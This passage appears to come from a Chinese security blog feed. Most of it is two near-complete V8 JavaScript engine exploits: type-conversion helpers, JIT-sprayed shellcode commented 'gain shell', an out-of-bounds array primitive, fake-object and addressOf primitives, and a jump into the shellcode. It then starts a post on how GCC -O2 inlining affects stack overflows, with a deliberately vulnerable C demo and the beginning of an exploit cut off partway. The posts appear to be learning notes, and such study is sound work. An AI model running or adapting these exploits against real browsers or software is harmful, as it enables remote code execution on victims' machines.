val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// gain shell</span><br><span class="line">const shellcode = () =&gt; &#123;return [</span><br><span class="line">    1.9553825422107533e-246,</span><br><span class="line">    1.9560612558242147e-246,</span><br><span class="line">    1.9995714719542577e-246,</span><br><span class="line">    1.9533767332674093e-246,</span><br><span class="line">    2.6348604765229606e-284</span><br><span class="line">];&#125;</span><br><span class="line"> </span><br><span class="line">for(let i = 0; i&lt; 40000; i++)&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">    var res = Reflect.construct(Derived, [], x);</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for (let i = 0; i &lt; 2000; i++) construct();</span><br><span class="line"> </span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">let oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">//p(oob_array);</span><br><span class="line">hexx(&#x27;lenth&#x27;,oob_array.length)</span><br><span class="line">let oob_element_addr = 0x219 - 1 + 8;</span><br><span class="line"></span><br><span class="line">let element_addr = 0x2c2129 - 1;</span><br><span class="line">let element_addr_start = element_addr + 8;</span><br><span class="line">let fake_map_addr = element_addr + 0x1000;</span><br><span class="line">let fake_object_addr = element_addr + 0x2000;</span><br><span class="line">let saved_fake_object_addr = element_addr + 0x100;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">//printhex(oob_element_addr);</span><br><span class="line">//printhex(element_addr);</span><br><span class="line">//printhex(element_addr_start);</span><br><span class="line">//printhex(fake_map_addr);</span><br><span class="line">//printhex(fake_object_addr);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">let victim_array = new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">//p(victim_array);</span><br><span class="line">//let float_arr = [1.1,2.2,3.3];</span><br><span class="line">//p(float_arr);</span><br><span class="line">//stop();</span><br><span class="line"></span><br><span class="line">oob_array[(fake_map_addr - oob_element_addr)/8] = i2f(0x2c04040400000061n);</span><br><span class="line">oob_array[(fake_map_addr - oob_element_addr)/8 + 1] = i2f(0x0a0007ff11000842n);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8] = i2f64(fake_map_addr+1,0x0);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(0x1000,0x1000);</span><br><span class="line">oob_array[(saved_fake_object_addr - oob_element_addr)/8] = i2f64(fake_object_addr+1,fake_object_addr+1);</span><br><span class="line"></span><br><span class="line">var fake_object = victim_array[(saved_fake_object_addr - element_addr_start)/4];</span><br><span class="line"></span><br><span class="line">// p(fake_object);</span><br><span class="line"> </span><br><span class="line">function addressOf(obj)&#123;</span><br><span class="line">    victim_array[0] = obj;</span><br><span class="line">    return i2lo(f2i(oob_array[(element_addr_start - oob_element_addr)/8]));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">//p(shellcode);</span><br><span class="line"> </span><br><span class="line">var shellcode_addr = addressOf(shellcode);</span><br><span class="line">hexx(&#x27;shellcode_addr&#x27;,shellcode_addr);</span><br><span class="line"> </span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(shellcode_addr - 8 + 0x18,0x1000);</span><br><span class="line"> </span><br><span class="line">var code_addr = i2lo(f2i(fake_object[0]));</span><br><span class="line">hexx(&#x27;code_addr&#x27;,code_addr);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(code_addr - 8 + 0x10,0x1000);</span><br><span class="line">var ins_base = (f2i(fake_object[0]));</span><br><span class="line"> </span><br><span class="line">var rop_addr = ins_base + 0x82n;</span><br><span class="line">fake_object[0] = i2f(rop_addr);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">//stop();</span><br><span class="line">shellcode();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208210311870.png" alt="image-20251208210311870"></p><p>下面不伪造map也可以getshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br></pre></td><td class="code"><pre><span class="line">class Helpers &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.buf = new ArrayBuffer(8);</span><br><span class="line">    this.f64 = new Float64Array(this.buf);</span><br><span class="line">    this.f32 = new Float32Array(this.buf);</span><br><span class="line">    this.u32 = new Uint32Array(this.buf);</span><br><span class="line">    this.u64 = new BigUint64Array(this.buf);</span><br><span class="line">    this.i64 = new BigInt64Array(this.buf);</span><br><span class="line"></span><br><span class="line">    this.state = &#123;&#125;;</span><br><span class="line">    this.i = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → uint64</span><br><span class="line">  f2i(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // uint64 → float64</span><br><span class="line">  i2f(x) &#123;</span><br><span class="line">    this.u64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int to hex string</span><br><span class="line">  hex(x) &#123;</span><br><span class="line">    return &quot;0x&quot; + x.toString(16);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to hex string</span><br><span class="line">  f2h(x) &#123;</span><br><span class="line">    return this.hex(this.f2i(x));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float to aligned address (clear low 2 bits)</span><br><span class="line">  f2a(x) &#123;</span><br><span class="line">    return this.f2i(x) &gt;&gt; 2n &lt;&lt; 2n;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // address to float (set low bit)</span><br><span class="line">  a2f(x) &#123;</span><br><span class="line">    return this.i2f(x | 1n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → int64 (signed)</span><br><span class="line">  f2is(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.i64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → float64 (signed)</span><br><span class="line">  i2fs(x) &#123;</span><br><span class="line">    this.i64[0] = x;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float64 → low 32-bit</span><br><span class="line">  f2lo(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // float64 → high 32-bit</span><br><span class="line">  f2hi(x) &#123;</span><br><span class="line">    this.f64[0] = x;</span><br><span class="line">    return this.u32[1];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // two 32-bit → float64</span><br><span class="line">  i2f64(lo, hi) &#123;</span><br><span class="line">    this.u32[0] = lo &gt;&gt;&gt; 0;</span><br><span class="line">    this.u32[1] = hi &gt;&gt;&gt; 0;</span><br><span class="line">    return this.f64[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → low 32-bit</span><br><span class="line">  i2lo(i) &#123;</span><br><span class="line">    return Number(i &amp; 0xffffffffn);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int64 → high 32-bit</span><br><span class="line">  i2hi(i) &#123;</span><br><span class="line">    return Number(i &gt;&gt; 32n);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  // float32 → int32</span><br><span class="line">  f32toi32(f) &#123;</span><br><span class="line">    this.f32[0] = f;</span><br><span class="line">    return this.u32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // int32 → float32</span><br><span class="line">  i32tof32(i) &#123;</span><br><span class="line">    this.u32[0] = i;</span><br><span class="line">    return this.f32[0];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  p(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  debug(arg) &#123;</span><br><span class="line">    %DebugPrint(arg);</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  stop() &#123;</span><br><span class="line">    %SystemBreak();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  hex32(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(8, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hex64(i) &#123;</span><br><span class="line">    return i.toString(16).padStart(16, &quot;0&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  hexx(str, val) &#123;</span><br><span class="line">    console.log(`[*] $&#123;str&#125;: 0x$&#123;val.toString(16)&#125;`);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  printhex(val) &#123;</span><br><span class="line">    console.log(&quot;0x&quot; + val.toString(16));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  add_ref(obj) &#123;</span><br><span class="line">    this.state[this.i++] = obj;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  gc() &#123;</span><br><span class="line">    new Array(0x7fe00000);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const helpers = new Helpers();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const f2i = x =&gt; helpers.f2i(x);</span><br><span class="line">const i2f = x =&gt; helpers.i2f(x);</span><br><span class="line">const hex = x =&gt; helpers.hex(x);</span><br><span class="line">const f2h = x =&gt; helpers.f2h(x);</span><br><span class="line">const f2a = x =&gt; helpers.f2a(x);</span><br><span class="line">const a2f = x =&gt; helpers.a2f(x);</span><br><span class="line">const f2is = x =&gt; helpers.f2is(x);</span><br><span class="line">const i2fs = x =&gt; helpers.i2fs(x);</span><br><span class="line">const f2lo = x =&gt; helpers.f2lo(x);</span><br><span class="line">const f2hi = x =&gt; helpers.f2hi(x);</span><br><span class="line">const i2f64 = (lo, hi) =&gt; helpers.i2f64(lo, hi);</span><br><span class="line">const i2lo = x =&gt; helpers.i2lo(x);</span><br><span class="line">const i2hi = x =&gt; helpers.i2hi(x);</span><br><span class="line">const f32toi32 = x =&gt; helpers.f32toi32(x);</span><br><span class="line">const i32tof32 = x =&gt; helpers.i32tof32(x);</span><br><span class="line">const p = x =&gt; helpers.p(x);</span><br><span class="line">const debug = x =&gt; helpers.debug(x);</span><br><span class="line">const stop = () =&gt; helpers.stop();</span><br><span class="line">const hex32 = x =&gt; helpers.hex32(x);</span><br><span class="line">const hex64 = x =&gt; helpers.hex64(x);</span><br><span class="line">const hexx = (str, val) =&gt; helpers.hexx(str, val);</span><br><span class="line">const printhex = x =&gt; helpers.printhex(x);</span><br><span class="line">const add_ref = x =&gt; helpers.add_ref(x);</span><br><span class="line">const gc = () =&gt; helpers.gc();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// gain shell</span><br><span class="line">const shellcode = () =&gt; &#123;return [</span><br><span class="line">    1.9553825422107533e-246,</span><br><span class="line">    1.9560612558242147e-246,</span><br><span class="line">    1.9995714719542577e-246,</span><br><span class="line">    1.9533767332674093e-246,</span><br><span class="line">    2.6348604765229606e-284</span><br><span class="line">];&#125;</span><br><span class="line"> </span><br><span class="line">for(let i = 0; i&lt; 40000; i++)&#123;</span><br><span class="line">    shellcode();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">var x = Array;</span><br><span class="line"> </span><br><span class="line">class Base &#123;&#125;</span><br><span class="line"> </span><br><span class="line">class Derived extends Base &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    x = new.target;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">function construct() &#123;</span><br><span class="line">    var res = Reflect.construct(Derived, [], x);</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">for (let i = 0; i &lt; 2000; i++) construct();</span><br><span class="line"> </span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">gc();</span><br><span class="line">//gc();</span><br><span class="line">let oob_array = construct();</span><br><span class="line">oob_array = construct();</span><br><span class="line">//p(oob_array);</span><br><span class="line">console.log(oob_array.length);</span><br><span class="line">let oob_element_addr = 0x219 - 1 + 8;</span><br><span class="line"></span><br><span class="line">let element_addr = 0x2c2129 - 1;</span><br><span class="line">let element_addr_start = element_addr + 8;</span><br><span class="line">//let fake_map_addr = element_addr + 0x1000;</span><br><span class="line">let fake_object_addr = element_addr + 0x2000;</span><br><span class="line">let saved_fake_object_addr = element_addr + 0x100;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">printhex(oob_element_addr);</span><br><span class="line">printhex(element_addr);</span><br><span class="line">printhex(element_addr_start);</span><br><span class="line">//printhex(fake_map_addr);</span><br><span class="line">printhex(fake_object_addr);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">let victim_array = new Array(0x7f00).fill(&#123;&#125;);</span><br><span class="line">//p(victim_array);</span><br><span class="line">let float_arr = [1.1,2.2,3.3];</span><br><span class="line">p(float_arr);</span><br><span class="line">//stop();</span><br><span class="line"></span><br><span class="line">//oob_array[(fake_map_addr - oob_element_addr)/8] = i2f(0x2c04040400000061n);</span><br><span class="line">//oob_array[(fake_map_addr - oob_element_addr)/8 + 1] = i2f(0x0a0007ff11000842n);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8] = i2f64(0x0018ece5,0x0);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(0x1000,0x1000);</span><br><span class="line">oob_array[(saved_fake_object_addr - oob_element_addr)/8] = i2f64(fake_object_addr+1,fake_object_addr+1);</span><br><span class="line"></span><br><span class="line">var fake_object = victim_array[(saved_fake_object_addr - element_addr_start)/4];</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">function addressOf(obj)&#123;</span><br><span class="line">    victim_array[0] = obj;</span><br><span class="line">    return i2lo(f2i(oob_array[(element_addr_start - oob_element_addr)/8]));</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">p(shellcode);</span><br><span class="line"> </span><br><span class="line">var shellcode_addr = addressOf(shellcode);</span><br><span class="line">printhex(shellcode_addr);</span><br><span class="line"> </span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(shellcode_addr - 8 + 0x18,0x1000);</span><br><span class="line"> </span><br><span class="line">var code_addr = i2lo(f2i(fake_object[0]));</span><br><span class="line">printhex(code_addr);</span><br><span class="line">oob_array[(fake_object_addr - oob_element_addr)/8 + 1] = i2f64(code_addr - 8 + 0x10,0x1000);</span><br><span class="line">var ins_base = (f2i(fake_object[0]));</span><br><span class="line"> </span><br><span class="line">var rop_addr = ins_base + 0x82n;</span><br><span class="line">fake_object[0] = i2f(rop_addr);</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">//stop();</span><br><span class="line">shellcode();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2025/12/08/V8Pwn%E7%9A%84%E5%AD%A6%E4%B9%A0/index/image-20251208210356932.png" alt="image-20251208210356932"></p>]]></content>
      
      
      <categories>
          
          <category> V8 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> V8 </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>O-Pwn</title>
      <link href="/2025/05/07/O-Pwn/index/"/>
      <url>/2025/05/07/O-Pwn/index/</url>
      
        <content type="html"><![CDATA[<p>O-Pwn</p><p>最近一个朋友和我在研究为什么有些时候IDA偏移分析失误时发现当程序ebp寻址改成了esp寻址有可能会导致IDA的偏移出现失误，那么编译参数有可能就加上了O参数</p><p>GCC 编译器的 <code>-O</code> 参数用于控制代码优化的级别，不同的优化级别会影响程序的执行效率、编译时间和生成的可执行文件大小</p><p>加上了-O参数后会导致原本的ebp寻址变成了esp寻址，IDA偏移分析失误这种情况通常出现在memcpy()复制函数溢出中</p><p>直接简单的溢出即使ebp寻址改成了esp寻址 IDA仍然偏移分析正确，但是随着O的参数的增加优化级别也更高，在O2的情况下</p><p>一些简短的存在漏洞的函数会被直接放在main函数中，编译器并不会为其开辟新的栈帧，如以下的demo</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">static char src[0x500];</span><br><span class="line"></span><br><span class="line">#pragma GCC optimize(&quot;-fno-stack-protector&quot;)</span><br><span class="line"></span><br><span class="line">void load()&#123;</span><br><span class="line">    setvbuf(stdout, 0, 2, 0);</span><br><span class="line">    setvbuf(stdin, 0, 1, 0);</span><br><span class="line">&#125;</span><br><span class="line">void vuln()&#123;</span><br><span class="line">    char buffer[64];</span><br><span class="line">    read(0,buffer,0x48);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    </span><br><span class="line">    load();</span><br><span class="line"></span><br><span class="line">    printf(&quot;pwn me!\n&quot;);</span><br><span class="line">    read(0,src,0x490);</span><br><span class="line"></span><br><span class="line">    printf(&quot;let&#x27;s overflow,but you seem can&#x27;t cover the ret_addr\n&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    printf(&quot;Hack for Fan\n&quot;);</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是编译参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc demo.c -o demo0 -g -m32 -O2</span><br></pre></td></tr></table></figure><p>下面是IDA逆向出的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[68]; // [esp+0h] [ebp-48h] BYREF</span><br><span class="line"></span><br><span class="line">  load();</span><br><span class="line">  puts(&quot;pwn me!&quot;);</span><br><span class="line">  read(0, src, 0x490u);</span><br><span class="line">  puts(&quot;let&#x27;s overflow,but you seem can&#x27;t cover the ret_addr&quot;);</span><br><span class="line">  read(0, buf, 0x48u);</span><br><span class="line">  puts(&quot;Hack for Fan&quot;);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现原本的vuln函数里的代码直接被放到main函数里了，这时就不能直接溢出了，因为通过调式发现以下汇编代码(以下情况仅32位会出现)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">► 0x804841f &lt;main+95&gt;     mov    ecx, dword ptr [ebp - 4]</span><br><span class="line">  0x8048422 &lt;main+98&gt;     add    esp, 0x10</span><br><span class="line">  0x8048425 &lt;main+101&gt;    xor    eax, eax</span><br><span class="line">  0x8048427 &lt;main+103&gt;    leave</span><br><span class="line">  0x8048428 &lt;main+104&gt;    lea    esp, [ecx - 4]</span><br><span class="line">  0x804842b &lt;main+107&gt;    ret</span><br></pre></td></tr></table></figure><p>那么这种情况的话就只能通过2次栈迁移来进行rop了</p><p>下面是exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 